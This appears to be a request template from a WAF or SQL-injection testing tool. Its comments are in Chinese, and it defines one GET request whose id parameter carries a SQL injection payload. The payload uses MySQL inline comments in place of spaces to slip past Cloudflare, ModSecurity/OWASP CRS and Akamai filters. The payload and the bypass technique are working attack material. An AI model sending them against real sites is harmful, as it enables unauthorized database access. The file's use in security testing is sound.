# @name: 内联注释替代空格(/**/)
# @tags: get,sqli,comment,space,cloudflare,modsecurity,akamai,id,bypass
# @color: cyan
# @validate: baseline_similarity
# @threshold: 0.90
# @intent: inline_comment_space
# @intent.param: id
# @intent.payload: id=1'/**/and/**/'a'='a
# @note: 参考 SQLMap space2comment，用 MySQL 内联注释 /**/ 替代空格分割关键字，绕过基于空格分词与关键字黑名单的检测（Cloudflare、ModSecurity/OWASP CRS、Akamai）。payload: id=1' and 'a'='a
GET /?id=1'/**/and/**/'a'='a HTTP/1.1
Host: {{TARGET_HOST_HEADER}}
User-Agent: {{USER_AGENT}}

